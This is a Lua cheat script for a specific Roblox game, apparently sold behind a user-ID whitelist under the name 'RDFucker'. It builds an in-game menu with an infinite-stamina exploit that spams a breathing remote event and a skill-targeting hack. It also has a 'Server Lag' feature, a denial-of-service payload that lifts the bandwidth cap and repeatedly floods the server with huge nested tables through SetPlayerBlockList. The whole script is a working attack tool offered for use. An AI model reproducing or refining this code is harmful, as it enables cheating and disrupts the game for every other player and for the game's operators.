whitelist = {
	4419760228,

}

function isAuthorized()

	for i, v in pairs(whitelist) do
		if v == game:GetService("Players").LocalPlayer.UserId then return true end
		return false
	end
end

-- Variables
local UIS = game:GetService("UserInputService")
local TS = game:GetService("TweenService")
local RS = game:GetService("ReplicatedStorage")
local CS = game:GetService("CollectionService")
local Knit = require(game:GetService("ReplicatedStorage").Knit.Packages.Knit)

local Plrs = game:GetService("Players")
local Plr = Plrs.LocalPlayer

local PlrGUI = Plr.PlayerGui

-- Functions

-- Creates a popup
function notify(text, state)
	local Error = RS.UI.Errors.Prefabs.Error:Clone()
	local ErrorDescription = Error.ErrorLabel
	local ErrorsGUI = Plr.PlayerGui.Errors
	ErrorsGUI.Enabled = true
	Error.Parent = Plr.PlayerGui.Errors.MainFrame
	Error.Size = UDim2.new(1, 0, 0, 0)
	ErrorDescription.Text = text
	if state == true then Error.BackgroundColor3 = Color3.fromRGB(32, 194, 32) end -- Positive
	if state == false then Error.BackgroundColor3 = Color3.fromRGB(194, 32, 32) end -- Negative
	if state == nil then Error.BackgroundColor3 = Color3.fromRGB(0, 0, 0) end -- Neutral
	task.defer(function()
		local TweenA = TS:Create(Error, TweenInfo.new(0.23), {Size = UDim2.new(1, 0, 0, math.max(ErrorDescription.TextBounds.Y / Plr.PlayerGui:WaitForChild("Errors").UIScale.Scale + 18, 44))})
		TweenA:Play()

		task.spawn(function()
			TweenA.Completed:Wait()
			task.wait(#text * 0.1 + 1)
			local TweenD = TS:Create(Error, TweenInfo.new(0.23), {Size = UDim2.new(1, 0, 0, 0)})
			TweenD:Play()
			TweenD.Completed:Wait()
			Error:Destroy()
		end)
	end)
end

-- Creates a title
function title(text, order)
	local v = Instance.new("TextLabel")
	v.LayoutOrder = order
	v.Parent = BodyFrame
	v.BackgroundTransparency = 1
	v.Size = UDim2.new(1, 0, 0, 25)
	v.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
	v.TextSize = 18
	v.Text = text
	v.TextColor3 = Color3.fromRGB(255, 255, 255)
end

-- Creates a button
function button(instance, text, order)
	instance.LayoutOrder = order
	instance.Parent = BodyFrame
	UICorner:Clone().Parent = instance
	instance.BackgroundTransparency = .25
	instance.Size = UDim2.new(1, 0, 0, 45)
	instance.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
	instance.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	instance.TextColor3 = Color3.fromRGB(255, 255, 255)
	instance.TextSize = 17
	instance.Text = text
end

-- Breath related functions
function breatheIn()
	game:GetService("ReplicatedStorage"):WaitForChild("Knit"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("BreathingService"):WaitForChild("RE"):WaitForChild("Breath"):FireServer("Start")
end

function breatheOut()
	game:GetService("ReplicatedStorage"):WaitForChild("Knit"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("BreathingService"):WaitForChild("RE"):WaitForChild("Breath"):FireServer("Stop")
end

local gameProcessed = false
UIS.InputBegan:Connect(function(key, gp)
	if not gp then
		gameProcessed = false
	else
		gameProcessed = true
	end
end)

function chatFocused()
	local chatBar = Plr.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar
	if chatBar ~= nil then
		if chatBar:isFocused() then
			return true
		end
	end

	return false
end

local breathKeybind = nil

for i, v in pairs(PlrGUI.Keybinds:GetDescendants()) do
	if v.Name == "Purpose" and v.Text == "Charge Breath" then
		breathKeybind = v.Parent.KeyOutline.KeyInner
	end
end
if Plr.Character ~= nil then
	Plr.Character:GetAttributeChangedSignal("ChargingBreath"):Connect(function()	
		if Plr.Character:GetAttribute("ChargingBreath") == true then
			breathKeybind.BackgroundColor3 = Color3.fromRGB(233, 127, 127)
		else
			breathKeybind.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		end
	end)
end

Plr.CharacterAdded:Connect(function(char)
	char:GetAttributeChangedSignal("ChargingBreath"):Connect(function()

		if char:GetAttribute("ChargingBreath") == true then
			breathKeybind.BackgroundColor3 = Color3.fromRGB(233, 127, 127)
		else
			breathKeybind.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		end
	end)
end)

-- GUI
local Features = Instance.new("ScreenGui")
Features.Parent = Plr.PlayerGui
Features.Name = "RDFucker"
Features.Enabled = false
Features.ResetOnSpawn = false

local UIScale = Instance.new("UIScale")
UIScale.Parent = Features
UIScale.Scale = PlrGUI.Settings.UIScale.Scale

PlrGUI.Settings.UIScale.Changed:Connect(function()
	UIScale.Scale = PlrGUI.Settings.UIScale.Scale
end)

local MainFrame = Instance.new("Frame")
MainFrame.Parent = Features
MainFrame.Name = "MainFrame"
MainFrame.AnchorPoint = Vector2.new(.5, .5)
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.BackgroundTransparency = .25
MainFrame.Position = UDim2.new(0.5, 0, .5, 0)
MainFrame.Size = UDim2.new(0, 322, 0, 380)

local Title = Instance.new("TextLabel")
Title.Parent = MainFrame
Title.Name = "Title"
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(1, 0, 0, 35)
Title.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
Title.TextSize = 20
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Text = "RDFucker"

UICorner = Instance.new("UICorner")
UICorner.Parent = MainFrame
UICorner.CornerRadius = UDim.new(0, 5)

BodyFrame = Instance.new("ScrollingFrame")
BodyFrame.Name = "BodyFrame"
BodyFrame.Parent = MainFrame
BodyFrame.AnchorPoint = Vector2.new(0.5, 0)
BodyFrame.BackgroundTransparency = 1
BodyFrame.Size = UDim2.new(1, -15, 1, -50)
BodyFrame.Position = UDim2.new(0.5, 0, 0, 40)
BodyFrame.ClipsDescendants = true
BodyFrame.BorderSizePixel = 0
BodyFrame.ScrollBarThickness = 0

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Parent = BodyFrame
UIListLayout.Padding = UDim.new(0, 5)
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder



-- Main
if game.PlaceId == 9103898828 then
	if isAuthorized() then
		if not _G.RDFucker then
			_G.RDFucker = true

			notify("Authorized successfully", true)
			wait(1.5)
			notify("Press H to view available features")


			-- GUI Toggle
			local featuresToggle = false
			UIS.InputBegan:Connect(function(key, gp)
				if gp then return end
				if key.KeyCode == Enum.KeyCode.H then

					local CCC = Knit.GetController("CharacterCameraController")
					if not featuresToggle then
						featuresToggle = true
						Features.Enabled = true
						CCC:DisableCameraLock()
					else
						featuresToggle = false
						Features.Enabled = false
						CCC:EnableCameraLock()
					end
				end
			end)


			-- GUI Titles

			title("Combat", 0)
			title("Miscellaneous", 5)


			-- GUI Buttons

			local SP = Knit.GetController("SprintController")

			local legitBreathing = Instance.new("TextButton")
			local infiniteBreathing = Instance.new("TextButton")
			local smartSkillTargeting = Instance.new("TextButton")
			local serverLag = Instance.new("TextButton")

			local legitBreathingToggle = false
			local infiniteBreathingToggle = false
			local smartSkillTargetingToggle = false
			local serverLagToggle = false

--[[
-- Legit Breathing
button(legitBreathing, "Legit Breathing", 1)

legitBreathing.MouseButton1Click:Connect(function()
	if legitBreathingToggle == false then

		if infiniteBreathingToggle == true then
			notify("Infinite Breathing disabled", false)
			infiniteBreathing.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
			infiniteBreathingToggle = false
		end

		legitBreathingToggle = true
		notify("Legit Breathing enabled", true)
		legitBreathing.BackgroundColor3 = Color3.fromRGB(201, 20, 20)

		-- Functionality
		while task.wait() do
			if legitBreathingToggle == true then
				local Char = Plr.Character
				if Char ~= nil then
					if Char:WaitForChild("Humanoid").Health > 0 and not Char:GetAttribute("Resetting") and not gameProcessed and not chatFocused() then
						if not SP.Sprinting then
							breatheIn()
						else
							breatheOut()
						end
					else
						if not UIS:IsKeyDown(Enum.KeyCode.G) then
							breatheOut()
						end
					end
				end
			else
				breatheOut()
				break
			end
		end
	else
		legitBreathingToggle = false
		notify("Legit Breathing disabled", false)
		legitBreathing.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	end
end)
]]

			-- Infinite Breathing
			button(infiniteBreathing, "Infinite Breathing", 1)

			infiniteBreathing.MouseButton1Click:Connect(function()
				if infiniteBreathingToggle == false then

		--[[
		if legitBreathingToggle == true then
			notify("Legit Breathing disabled", false)
			legitBreathing.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
			legitBreathingToggle = false
		end
]]

					infiniteBreathingToggle = true
					notify("Infinite Breathing enabled", true)
					infiniteBreathing.BackgroundColor3 = Color3.fromRGB(201, 20, 20)

					-- Functionality
					while task.wait() do
						if infiniteBreathingToggle == true then
							local Char = Plr.Character
							if Char ~= nil then
								if Char:WaitForChild("Humanoid").Health > 0 and not Char:GetAttribute("Resetting") then
									if not SP.Sprinting then
										breatheIn()
									else
										if Char.BreathCharge.Value <= 10 then
											for i = 1, 7 do
												breatheIn()
												wait()
												breatheOut()

												if i == 7 then
													breatheIn()
													wait(.1)
													breatheOut()
												end
											end
										else
											breatheOut()
										end
									end
								else
									if not UIS:IsKeyDown(Enum.KeyCode.G) then
										breatheOut()
									end
								end
							end
						else
							breatheOut()
							break
						end
					end
				else
					infiniteBreathingToggle = false
					notify("Infinite Breathing disabled", false)
					infiniteBreathing.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
				end
			end)

			-- Smart Skill Targeting
			button(smartSkillTargeting, "Smart Skill Targeting", 2)

			smartSkillTargeting.MouseButton1Click:Connect(function()
				if smartSkillTargetingToggle == false then
					smartSkillTargetingToggle = true
					notify("Smart Skill Targeting enabled", true)
					smartSkillTargeting.BackgroundColor3 = Color3.fromRGB(201, 20, 20)

					-- Functionality
					while task.wait() do
						if smartSkillTargetingToggle == true then
							for i, v in pairs(game.Workspace.Characters:GetChildren()) do
								if v:FindFirstChild("Blocking") then
									CS:AddTag(v, "PickedUp")
								end
							end
						else
							break
						end
					end
				else
					smartSkillTargetingToggle = false
					notify("Smart Skill Targeting disabled", true)
					smartSkillTargeting.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
				end
			end)

			-- Server Lag
			button(serverLag, "Server Lag", 6)

			serverLag.MouseButton1Click:Connect(function()
				if serverLagToggle == false then
					serverLagToggle = true
					notify("Server Lag enabled", true)
					serverLag.BackgroundColor3 = Color3.fromRGB(201, 20, 20)

					-- Functionality
					while task.wait(1) do
						if serverLagToggle == true then
							game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge)

							local function getmaxvalue(val)

								if type(val) ~= "number" then
									return nil
								end
								local calculateperfectval = (499999 / (val + 2))
								return calculateperfectval
							end

							local maintable = {}
							local spammedtable = {}

							table.insert(spammedtable, {})
							local z = spammedtable[1]

							for i = 1, 250 do
								local tableins = {}
								table.insert(z, tableins)
								z = tableins
							end

							local calculatemax = getmaxvalue(250)
							local maximum

							if calculatemax then
								maximum = calculatemax
							else
								maximum = 999999
							end

							for i = 1, maximum do
								table.insert(maintable, spammedtable)
							end

							game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
						else
							break
						end
					end
				else
					serverLagToggle = false
					notify("Server Lag disabled", false)
					serverLag.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
				end
			end)
		else
			notify("RDFucker is already running", false)
		end
	else
		notify("You're not authorized", false)
		wait(1.5)
		notify("Please purchase RDFucker")
	end
end
